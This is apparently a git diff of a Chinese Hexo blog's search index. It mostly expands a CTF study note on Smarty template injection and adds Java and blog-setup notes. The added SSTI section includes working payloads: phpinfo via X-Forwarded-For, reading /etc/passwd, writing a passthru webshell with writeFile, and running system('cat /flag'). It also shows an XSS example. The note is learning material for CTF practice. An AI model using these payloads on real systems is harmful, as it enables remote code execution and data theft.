@@ -1,9 +1,59 @@
 <?xml version="1.0" encoding="utf-8"?>
 <search>
   <entry>
+    <title>博客建设记录</title>
+    <url>/2025/03/01/%E5%8D%9A%E5%AE%A2%E5%BB%BA%E8%AE%BE%E8%AE%B0%E5%BD%95/</url>
+    <content><![CDATA[<p>主题：next gemini</p>
+<p>25&#x2F;3&#x2F;1</p>
+<p>换主题</p>
+<p>auto_excerpt: #自动摘录（不推荐）</p>
+<p>enable: false</p>
+<p>length: 150</p>
+<p>(这个没有用)</p>
+<p>只能用</p>
+<span id="more"></span>
+
+<p>*评论系统：valine（能看得到评论界面无法评论）</p>
+<p>*加密：测试后发现输入密码后有回显但是无法看到文章</p>
+<p>看板娘；神秘出现,</p>
+<p>我就输入了npm install hexo-helper-live2d –save 这一条命令就行了吗？？？</p>
+<p>25&#x2F;2&#x2F;24</p>
+<p>因为 遮挡了右边目录删掉了看板娘，画风不符</p>
+<p>25&#x2F;2&#x2F;27</p>
+]]></content>
+      <categories>
+        <category>Index</category>
+      </categories>
+  </entry>
+  <entry>
+    <title>Java学习笔记</title>
+    <url>/2025/03/04/Java%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/</url>
+    <content><![CDATA[<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">public class Main&#123;</span><br><span class="line">    public static void main(String[] args)&#123;</span><br><span class="line">        System.out.println(&quot;Hello World!&quot;);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<span id="more"></span>
+
+<p>完整的程序代码如上：</p>
+<ul>
+<li><code>public</code>：权限修饰符，表示这一个可以公开访问的类，类似的还有 <code>protected、default、private</code>，后续学习过程中再一一介绍；</li>
+<li><code>class</code>：Java 关键字，表示这是一个类；</li>
+<li><code>Main</code>： 表示我们的类名，在保存时文件一定要和它同名，否则你的程序是编译不了的。你可以试试，如果把我们上面的 <code>Main.java</code> 改成其他名字，你看看是不是还能编译成功呢？</li>
+<li><code>public static void main(String[] args)&#123;&#125;</code>：主方法，这是我们以后最常接触到的一个方法，每个主类当中都必须有一个 <code>main</code> 方法；</li>
+<li><code>System.out.println(&quot;Hello World!&quot;)</code>：控制台输出语句，执行该语句会在控制台中输出字符串，字符串要用双引号 <code>&quot;&quot;</code> 括起来，你可以把其中的 <code>Hello Wolrd!</code> 换成你想要打印的内容试试看。</li>
+</ul>
+]]></content>
+      <categories>
+        <category>Java</category>
+      </categories>
+      <tags>
+        <tag>笔记</tag>
+      </tags>
+  </entry>
+  <entry>
     <title>让AI写作业的尝试</title>
     <url>/2025/03/02/%E8%AE%A9AI%E5%86%99%E4%BD%9C%E4%B8%9A%E7%9A%84%E5%B0%9D%E8%AF%95/</url>
     <content><![CDATA[<p>改进提示词： “请用以下规范输出： 1.语言平实直述，避免抽象隐喻； 2.使用日常场景化案例辅助说明； 3.优先选择具体名词替代抽象概念； 4.保持段落简明（不超过5行）； 5.技术表述需附通俗解释； 6.禁用文学化修辞； 7.重点信息前置； 8.复杂内容分点说明； 9.保持口语化但不过度简化专业内容； 10.确保信息准确前提下优先选择大众认知词汇。”</p>
+<span id="more"></span>
+
 <p>请用以下规范输出： 1.语言平实直述，避免抽象隐喻； 2.使用日常场景化案例辅助说明； 3.优先选择具体名词替代抽象概念； 4.保持段落简明（不超过5行）； 5.技术表述需附通俗解释； 6.禁用文学化修辞； 7.重点信息前置； 8.复杂内容分点说明； 9.保持口语化但不过度简化专业内容； 10.确保信息准确前提下优先选择大众认知词汇。 总是专注于我的问题的关键点，以确定我的意图。将复杂的问题或任务分解为较小、可管理的步骤，并使用推理解释每一个步骤。提供多种观点或解决方案。如果问题不清楚或模棱两可，请先询问更多细节以确认你的理解，然后再回答。引用可信的来源或参考来支持你的回答，如果可以，请提供链接。如果之前的回应中出现错误，要承认并纠正它。在回答后，提供三个继续探讨原始主题的问题，格式为Q1、Q2和Q3，并用粗体表示。在每个问题前后分别加上两行换行符（”\n”）以作间隔。这些问题应该具有启发性，进一步深入探讨原始主题。</p>
 <p>将所有的句子过渡词和连接词替换为最基 础、最常用的词语。尽量使用简单、直接的 表达方式，避免使用复杂或生僻的词汇。确 保句子之间的逻辑关系清晰。删掉文末总结 的部分 </p>
 <p>将以上文字重新修改，写作风格界于书面学 术写作和口语描述之间。保证所有的句子都 要有主语，不要用复杂的长难句，尽量用短 句输出。替换掉所有的非日常词汇。</p>
@@ -266,12 +316,15 @@
 <p><a href="https://drinkflower.asia/wordpress/archives/441">严格过滤下的SSTI注入</a></p>
 <h1 id="GWCTF-2019-你的名字"><a href="#GWCTF-2019-你的名字" class="headerlink" title="[GWCTF 2019]你的名字"></a>[GWCTF 2019]你的名字</h1><h1 id="NISACTF-2022-midlevel"><a href="#NISACTF-2022-midlevel" class="headerlink" title="[NISACTF 2022]midlevel"></a>[NISACTF 2022]midlevel</h1><img src="/2025/03/01/SSTI%E9%9B%86%E4%B8%AD%E5%AD%A6%E4%B9%A0%E9%A2%98%E7%9B%AE%E6%B1%87%E6%80%BB/20230226102815-3922049c-b57d-1.png" class="" title="20230226102815-3922049c-b57d-1">
 
-<h2 id="Smarty漏洞成因："><a href="#Smarty漏洞成因：" class="headerlink" title="Smarty漏洞成因："></a>Smarty漏洞成因：</h2><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">    <span class="keyword">require_once</span>(<span class="string">&#x27;./smarty/libs/&#x27;</span> . <span class="string">&#x27;Smarty.class.php&#x27;</span>);</span><br><span class="line">    <span class="variable">$smarty</span> = <span class="keyword">new</span> <span class="title class_">Smarty</span>();</span><br><span class="line">    <span class="variable">$ip</span> = <span class="variable">$_SERVER</span>[<span class="string">&#x27;HTTP_X_FORWARDED_FOR&#x27;</span>];</span><br><span class="line">    <span class="variable">$smarty</span>-&gt;<span class="title function_ invoke__">display</span>(<span class="string">&quot;string:&quot;</span>.<span class="variable">$ip</span>);     <span class="comment">// display函数把标签替换成对象的php变量；显示模板</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<p>Smarty漏洞成因：</p>
+<p><a href="https://github.com/smarty-php/smarty/blob/fa269d418fb4d3687558746e67e054c225628d13/libs/sysplugins/smarty_internal_write_file.php#L16">https://github.com/smarty-php/smarty/blob/fa269d418fb4d3687558746e67e054c225628d13/libs/sysplugins/smarty_internal_write_file.php#L16</a></p>
+<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">    <span class="keyword">require_once</span>(<span class="string">&#x27;./smarty/libs/&#x27;</span> . <span class="string">&#x27;Smarty.class.php&#x27;</span>);</span><br><span class="line">    <span class="variable">$smarty</span> = <span class="keyword">new</span> <span class="title class_">Smarty</span>();</span><br><span class="line">    <span class="variable">$ip</span> = <span class="variable">$_SERVER</span>[<span class="string">&#x27;HTTP_X_FORWARDED_FOR&#x27;</span>];</span><br><span class="line">    <span class="variable">$smarty</span>-&gt;<span class="title function_ invoke__">display</span>(<span class="string">&quot;string:&quot;</span>.<span class="variable">$ip</span>);     <span class="comment">// display函数把标签替换成对象的php变量；显示模板</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
 
 <p>这段 PHP 代码的关键漏洞点在于 <strong>SSTI（服务器端模板注入）</strong>，主要问题出现在这一行：</p>
-<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">php</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">复制编辑</span><br><span class="line">$smarty-&gt;display(&quot;string:&quot;.$ip);</span><br></pre></td></tr></table></figure>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">$smarty-&gt;display(&quot;string:&quot;.$ip);</span><br></pre></td></tr></table></figure>
 
-<h3 id="SSTI-漏洞分析"><a href="#SSTI-漏洞分析" class="headerlink" title="SSTI 漏洞分析"></a><strong>SSTI 漏洞分析</strong></h3><hr>
+<blockquote>
+<h3 id="SSTI-漏洞分析-ds"><a href="#SSTI-漏洞分析-ds" class="headerlink" title="SSTI 漏洞分析(ds)"></a><strong>SSTI 漏洞分析</strong>(ds)</h3><hr>
 <h4 id="1-SERVER-HTTP-X-FORWARDED-FOR-可控"><a href="#1-SERVER-HTTP-X-FORWARDED-FOR-可控" class="headerlink" title="1. $_SERVER[&#39;HTTP_X_FORWARDED_FOR&#39;] 可控"></a><strong>1. <code>$_SERVER[&#39;HTTP_X_FORWARDED_FOR&#39;]</code> 可控</strong></h4><ul>
 <li><pre><code>$_SERVER[&#39;HTTP_X_FORWARDED_FOR&#39;]
 <figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line"></span><br><span class="line">是 HTTP 请求头字段，攻击者可以通过伪造请求头来控制其值，比如：</span><br><span class="line"></span><br></pre></td></tr></table></figure>
@@ -312,12 +365,37 @@ scss
 
 复制编辑
 X-Forwarded-For: &#123;phpinfo()&#125;
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line"></span><br><span class="line">  如果 **PHP 允许 `Smarty` 解析 `php` 标签**，就会执行 `phpinfo()`，泄露 PHP 配置信息。</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">{% asset_img "QQ20250304-170345.png" "QQ20250304-170345" %}</span><br><span class="line"></span><br><span class="line">## smarty模板操作手册</span><br><span class="line"></span><br><span class="line">从这里开始就有点难懂</span><br><span class="line"></span><br><span class="line">大白话理解版本：</span><br><span class="line"></span><br><span class="line">当你通过分支图确定是smarty模板</span><br><span class="line"></span><br></pre></td></tr></table></figure>
 </code></pre>
-<p>如果 <strong>PHP 允许 <code>Smarty</code> 解析 <code>php</code> 标签</strong>，就会执行 <code>phpinfo()</code>，泄露 PHP 配置信息。</p>
 </li>
 </ul>
-<p>这个地方对应的就是xff头处存在smarty模板，我们可以利用smarty形式来进行攻击。</p>
-<p>摘自：<a href="https://xz.aliyun.com/news/11666?time__1311=eqUxuQDtDQitWkxBkFDnQFeG=2KiIxG8mKeD&u_atoken=d1877f7d5e5153ab62305384a28e30a9&u_asig=1a0c399a17410769091401613e00c7">Smarty模板注入&amp;CVE-2017-1000480</a></p>
+<p>a{<em>conmmet</em>b}</p>
+</blockquote>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line"></span><br><span class="line">没有回显comment的值，就可以确定&#123;$smarty.version&#125;</span><br><span class="line"></span><br><span class="line">下面有1+3个可以选</span><br><span class="line"></span><br><span class="line"># 以下我都是直接复制过来没仔细看获取类的静态方法根本没看懂</span><br><span class="line"></span><br><span class="line">### 获取类的静态方法：</span><br><span class="line"></span><br><span class="line">$smarty内置变量可用于访问各种环境变量，比如我们使用 self 得到 smarty 这个类以后，我们就去找 smarty 给我们的方法:</span><br><span class="line"></span><br><span class="line">#### getStreamVariable():</span><br><span class="line"></span><br></pre></td></tr></table></figure>
+<p>public function getStreamVariable($variable)&#x2F;&#x2F;variable其实就是文件路径<br>{<br>        $_result &#x3D; ‘’;<br>        $fp &#x3D; fopen($variable, ‘r+’);&#x2F;&#x2F;从此处开始对文件进行读取<br>        if ($fp) {<br>            while (!feof($fp) &amp;&amp; ($current_line &#x3D; fgets($fp)) !&#x3D;&#x3D; false) {<br>                $_result .&#x3D; $current_line;<br>            }<br>            fclose($fp);<br>            return $_result;<br>        }<br>        $smarty &#x3D; isset($this-&gt;smarty) ? $this-&gt;smarty : $this;<br>        if ($smarty-&gt;error_unassigned) {<br>            throw new SmartyException(‘Undefined stream variable “‘ . $variable . ‘“‘);<br>        } else {<br>            return null;<br>        }<br>    }<br>&#x2F;&#x2F;可以看到这个方法可以读取一个文件并返回其内容，所以我们可以用self来获取Smarty对象并调用这个方法<br>smarty&#x2F;libs&#x2F;sysplugins&#x2F;smarty_internal_data.php　　——&gt;　　getStreamVariable() 这个方法可以获取传入变量的流<br>例如：<br>{self::getStreamVariable(“file:&#x2F;&#x2F;&#x2F;etc&#x2F;passwd”)}</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line"></span><br><span class="line">- 不过这种利用方式只存在于旧版本中，而且在 3.1.30 的 Smarty 版本中官方已经将 `getStreamVariable` 静态方法删除。</span><br><span class="line"></span><br><span class="line">#### writeFile：</span><br><span class="line"></span><br></pre></td></tr></table></figure>
+<p>public function writeFile($_filepath, $_contents, Smarty $smarty)<br>&#x2F;&#x2F;我们可以发现第三个参数$smarty其实就是一个smarty模板类型，要求是拒绝非Smarty类型的输入，这就意味着我们需要获取对Smarty对象的引用，然后我们在smarty中找到了 self::clearConfig()：<br>public function clearConfig($varname &#x3D; null)<br>{<br>    return Smarty_Internal_Extension_Config::clearConfig($this, $varname);<br>}<br>smarty&#x2F;libs&#x2F;sysplugins&#x2F;smarty_internal_write_file.php　　——&gt;　　Smarty_Internal_Write_File 这个类中有一个writeFile方法<br>{Smarty_Internal_Write_File::writeFile($SCRIPT_NAME,”<?php passthru($_GET['cmd']); ?>“,self::clearConfig())}</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line"></span><br><span class="line">但是writeFile方法也有版本限制，所以我们首先要确定模板的版本，再决定对应的攻击方法。</span><br><span class="line"></span><br><span class="line">### `&#123;php&#125;&#123;/php&#125;`</span><br><span class="line"></span><br></pre></td></tr></table></figure>
+<p>{php}phpinfo();{&#x2F;php}  #执行相应的php代码</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line"></span><br><span class="line">Smarty支持使用 &#123;php&#125;&#123;/php&#125; 标签来执行被包裹其中的php指令，最常规的思路自然是先测试该标签。但因为在Smarty3版本中已经废弃&#123;php&#125;标签，强烈建议不要使用。在Smarty 3.1，&#123;php&#125;仅在SmartyBC中可用。</span><br><span class="line"></span><br><span class="line">### `&#123;literal&#125;`</span><br><span class="line"></span><br><span class="line">- &#123;literal&#125; 可以让一个模板区域的字符原样输出。这经常用于保护页面上的Javascript或css样式表，避免因为 Smarty 的定界符而错被解析。</span><br><span class="line">- 在 PHP5 环境下存在一种 PHP 标签， `&lt;script&gt;language=&quot;php&quot;&gt;&lt;/script&gt;，`我们便可以利用这一标签进行任意的 PHP 代码执行。</span><br><span class="line">- 通过上述描述也可以想到，我们完全可以利用这一种标签来实现 XSS 攻击，这一种攻击方式在 SSTI 中也是很常见的，因为基本上所有模板都会因为需要提供类似的功能。</span><br><span class="line"></span><br></pre></td></tr></table></figure>
+<p>{literal}alert(‘xss’);{&#x2F;literal}</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line"></span><br><span class="line">### `&#123;if&#125;&#123;/if&#125;`</span><br><span class="line"></span><br></pre></td></tr></table></figure>
+<p>{if phpinfo()}{&#x2F;if}</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line"></span><br><span class="line">Smarty的 &#123;if&#125; 条件判断和PHP的if非常相似，只是增加了一些特性。每个&#123;if&#125;必须有一个配对的&#123;/if&#125;，也可以使用&#123;else&#125; 和 &#123;elseif&#125;，全部的PHP条件表达式和函数都可以在if内使用，如`||`，`or`，`&amp;&amp;`，`and`，`is_array()`等等，如：</span><br><span class="line"></span><br></pre></td></tr></table></figure>
+<p>{if is_array($array)}{&#x2F;if}</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line"></span><br><span class="line">还可以用来执行命令：</span><br><span class="line"></span><br></pre></td></tr></table></figure>
+<p>{if phpinfo()}{&#x2F;if}<br>{if readfile (‘&#x2F;flag’)}{&#x2F;if}<br>{if show_source(‘&#x2F;flag’)}{&#x2F;if}<br>{if system(‘cat &#x2F;flag’)}{&#x2F;if}</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line"></span><br><span class="line">这道题的版本为3.1.30</span><br><span class="line"></span><br></pre></td></tr></table></figure>
+<p>&#x2F;&#x2F;所以这个位置我们不能够使用获取类的静态方法来进行攻击，也不能用php标签来进行攻击。<br>&#x2F;&#x2F;又因为php的版本是php7，所以我们不能用literal标签，最后我们使用if来进行攻击</p>
+<pre><code>
+
+
+
+
+
+
+参考：[Smarty模板注入&amp;CVE-2017-1000480](https://xz.aliyun.com/news/11666?time__1311=eqUxuQDtDQitWkxBkFDnQFeG%3D2KiIxG8mKeD&amp;u_atoken=d1877f7d5e5153ab62305384a28e30a9&amp;u_asig=1a0c399a17410769091401613e00c7)
+</code></pre>
 ]]></content>
       <categories>
         <category>Web</category>
@@ -326,31 +404,6 @@ X-Forwarded-For: &#123;phpinfo()&#125;
         <tag>笔记</tag>
         <tag>SSTI</tag>
       </tags>
-  </entry>
-  <entry>
-    <title>博客建设记录</title>
-    <url>/2025/03/01/%E5%8D%9A%E5%AE%A2%E5%BB%BA%E8%AE%BE%E8%AE%B0%E5%BD%95/</url>
-    <content><![CDATA[<p>主题：next gemini</p>
-<p>25&#x2F;3&#x2F;1</p>
-<p>换主题</p>
-<p>auto_excerpt: #自动摘录（不推荐）</p>
-<p>enable: false</p>
-<p>length: 150</p>
-<p>(这个没有用)</p>
-<p>只能用</p>
-<span id="more"></span>
-
-<p>*评论系统：valine（能看得到评论界面无法评论）</p>
-<p>*加密：测试后发现输入密码后有回显但是无法看到文章</p>
-<p>看板娘；神秘出现,</p>
-<p>我就输入了npm install hexo-helper-live2d –save 这一条命令就行了吗？？？</p>
-<p>25&#x2F;2&#x2F;24</p>
-<p>因为 遮挡了右边目录删掉了看板娘，画风不符</p>
-<p>25&#x2F;2&#x2F;27</p>
-]]></content>
-      <categories>
-        <category>Index</category>
-      </categories>
   </entry>
   <entry>
     <title>[FSCTF 2023]base套</title>
@@ -475,7 +528,7 @@ X-Forwarded-For: &#123;phpinfo()&#125;
 <p>在这种面向对象的语言中，获取父类这种思想要贯穿始终，理论基础就是 Python 的魔法方法 PHP 的自省 JAVA 的反射 机制</p>
 </blockquote>
 <h1 id="PHP命令执行"><a href="#PHP命令执行" class="headerlink" title="PHP命令执行"></a>PHP命令执行</h1><h1 id="python前置知识"><a href="#python前置知识" class="headerlink" title="python前置知识"></a>python前置知识</h1><p>关于类：</p>
-<p><a href="https://blog.csdn.net/qq_45779334/article/details/107858999">https://blog.csdn.net/qq_45779334/article/details/107858999</a></p>
+<p><a href="https://blog.csdn.net/qq_45779334/article/details/107858999">python——class类和方法的用法详解</a></p>
 <h1 id="相关链接"><a href="#相关链接" class="headerlink" title="相关链接"></a>相关链接</h1><p><a href="https://www.k0rz3n.com/2018/11/12/%E4%B8%80%E7%AF%87%E6%96%87%E7%AB%A0%E5%B8%A6%E4%BD%A0%E7%90%86%E8%A7%A3%E6%BC%8F%E6%B4%9E%E4%B9%8BSSTI%E6%BC%8F%E6%B4%9E/%E6%9C%80%E5%A5%BD%E7%9A%84">https://www.k0rz3n.com/2018/11/12/%E4%B8%80%E7%AF%87%E6%96%87%E7%AB%A0%E5%B8%A6%E4%BD%A0%E7%90%86%E8%A7%A3%E6%BC%8F%E6%B4%9E%E4%B9%8BSSTI%E6%BC%8F%E6%B4%9E/最好的</a></p>
 <p>俱乐部卢师傅写的例会文件</p>
 ]]></content>
@@ -952,7 +1005,7 @@ X-Forwarded-For: &#123;phpinfo()&#125;
     <content><![CDATA[<p>此为个人理解，争取往大白话，口语化方向看齐。</p>
 <h1 id="接口"><a href="#接口" class="headerlink" title="接口"></a>接口</h1><h1 id="CDN"><a href="#CDN" class="headerlink" title="CDN"></a>CDN</h1><h1 id="技术栈"><a href="#技术栈" class="headerlink" title="技术栈"></a>技术栈</h1><h1 id="CMS"><a href="#CMS" class="headerlink" title="CMS"></a>CMS</h1><h1 id="CMD指纹"><a href="#CMD指纹" class="headerlink" title="CMD指纹"></a>CMD指纹</h1><h1 id="CVE"><a href="#CVE" class="headerlink" title="CVE"></a>CVE</h1><h1 id="0day"><a href="#0day" class="headerlink" title="0day"></a>0day</h1><p>没有被公开发表的漏洞。也就是说你做这道题不可以查已经发表的CVE来复现得到flag。</p>
 <h1 id="SRC"><a href="#SRC" class="headerlink" title="SRC"></a>SRC</h1><h1 id="wp-exp-poc-payload"><a href="#wp-exp-poc-payload" class="headerlink" title="wp exp poc payload"></a>wp exp poc payload</h1><p>“答案”</p>
-<h1 id="webshell-shell-web"><a href="#webshell-shell-web" class="headerlink" title="webshell shell web"></a>webshell shell web</h1><h1 id="cookie-session-token"><a href="#cookie-session-token" class="headerlink" title="cookie session token"></a>cookie session token</h1><h1 id="jwt-js"><a href="#jwt-js" class="headerlink" title="jwt js"></a>jwt js</h1><p>JWT 由三部分组成： Header 头部、 Payload 负载 和 Signature 签名，它是一个很长的字符串，中间用点（.）隔开。客户端收到服务器返回的 JWT，可以储存在 Cookie 里面，也可以储存在 localStorage。</p>
+<h1 id="webshell-shell-web"><a href="#webshell-shell-web" class="headerlink" title="webshell shell web"></a>webshell shell web</h1><h1 id="cookie-session-token"><a href="#cookie-session-token" class="headerlink" title="cookie session token"></a>cookie session token</h1><h1 id="jwt-js-json-jdk-java"><a href="#jwt-js-json-jdk-java" class="headerlink" title="jwt js json jdk java"></a>jwt js json jdk java</h1><p>JWT 由三部分组成： Header 头部、 Payload 负载 和 Signature 签名，它是一个很长的字符串，中间用点（.）隔开。客户端收到服务器返回的 JWT，可以储存在 Cookie 里面，也可以储存在 localStorage。</p>
 <figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line"><span class="title class_">Header</span>.<span class="property">Payload</span>.<span class="property">Signature</span></span><br></pre></td></tr></table></figure>
 
 <p>长这样：</p>
@@ -1357,8 +1410,8 @@ X-Forwarded-For: &#123;phpinfo()&#125;
         <category>Web</category>
       </categories>
       <tags>
-        <tag>SQL注入</tag>
         <tag>反序列化</tag>
+        <tag>SQL注入</tag>
         <tag>PHP伪协议</tag>
       </tags>
   </entry>
